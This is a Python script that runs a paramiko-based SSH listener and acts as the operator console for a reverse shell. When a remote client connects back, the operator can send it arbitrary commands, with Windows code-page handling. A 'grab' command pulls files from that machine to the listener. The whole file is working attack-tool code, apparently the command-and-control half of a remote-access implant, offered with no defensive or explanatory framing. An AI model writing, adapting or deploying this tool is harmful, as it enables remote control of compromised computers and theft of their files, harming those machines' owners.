import argparse
import socket
import sys
import threading

import paramiko


class Server (paramiko.ServerInterface):
    def __init__(self, username, password):
        self.username = username
        self.password = password
        self.event = threading.Event()

    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        if (username == self.username) and (password == self.password):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED


def set_cp(chan, cp=866):
    chan.send(f'chcp {cp}')
    print(chan.recv(1024).decode('cp866'))


def get_files(chan):
    count = 0
    while True:
        try:
            size = chan.recv(16)     # filename length is limitted to 255 bytes.
            if b'[+] Done' in size:
                print(size.decode('utf-8'))
                return
            size = int(size, 2)
            filename = chan.recv(size)
            filesize = chan.recv(32)
            filesize = int(filesize, 2)
            with open(filename, 'wb') as file_to_write:
                chunksize = 4096
                while filesize > 0:
                    if filesize < chunksize:
                        chunksize = filesize
                    data = chan.recv(chunksize)
                    file_to_write.write(data)
                    filesize -= len(data)
            count += 1
            print(f"[{count}]: File({filename}) received")
        except Exception as e:
            print(e)
            return


def main():
    # host_key = paramiko.RSAKey(filename='test_rsa.key') -- if you have your own key
    host_key = paramiko.RSAKey.generate(2048)

    parser = argparse.ArgumentParser(description='Server')
    parser.add_argument('un', help='the username to establish ssh connection')
    parser.add_argument('ps', help='the password to establish ssh connection')
    parser.add_argument('-p', '--port', type=int, help='the ssh port, 1234 by default')
    args = parser.parse_args()

    server = Server(args.un, args.ps)
    port = args.port if args.port else 1234  # 1234 port by default

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # allow to bind an IP address that previously connected and left the socket in TIME_WAIT
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        ip = socket.gethostbyname('0.0.0.0')
        sock.bind((ip, port))
        sock.listen(10)
    except Exception as e:
        print(e.__class__.__name__ + str(e))
        sock.close()
        sys.exit(1)
    try:
        while True:
            print(f'[+] Listening for connection (port: {port})...')
            client, addr = sock.accept()
            print(addr)
            print('[+] Got a connection')
            t = paramiko.Transport(client)
            if not t.load_server_moduli():
                print('[-] Failed to load moduli (group-exchange will be unsupported).')
            t.add_server_key(host_key)
            try:
                t.start_server(server=server)
            except paramiko.SSHException:
                print('[-] SSH negotiation failed.')
            chan = t.accept(20)
            if chan is None:
                print('[-] No authenticated or timeout is over\n')
            else:
                print('[+] Authenticated')
                sock.close()
                break

        # check connection communication
        ip_client, platform = chan.recv(64).decode('utf-8').split()
        print(addr[0])
        # platform = chan.recv(16).decode('utf-8')
        chan.sendall('ok')
        # if os is windows -> change cp
        print(f'platform: {platform}')
        if platform.startswith('win'):
            set_cp(chan)

        # command cycle
        while True:
            command = input(f"@{ip_client}:~$")
            if not command:
                continue
            chan.sendall(command)
            if 'grab' in command:
                status = chan.recv(1024).decode('utf-8')
                if status == 'ok':
                    print('start receiving')
                    get_files(chan)
                else:
                    print(status)
            elif command == 'server stop':
                # chan.close()
                t.close()  # close all channels are tied to it
                sys.exit(0)
            else:
                info = chan.recv(4096)
                try:
                    print(info.decode('utf-8'))
                except Exception:
                    print(info.decode('cp866'))
    except Exception as e:
        print(e.__class__.__name__ + ': ' + str(e))
        try:
            t.close()
        except Exception as e:
            print(e)
        sys.exit(1)


if __name__ == "__main__":
    main()
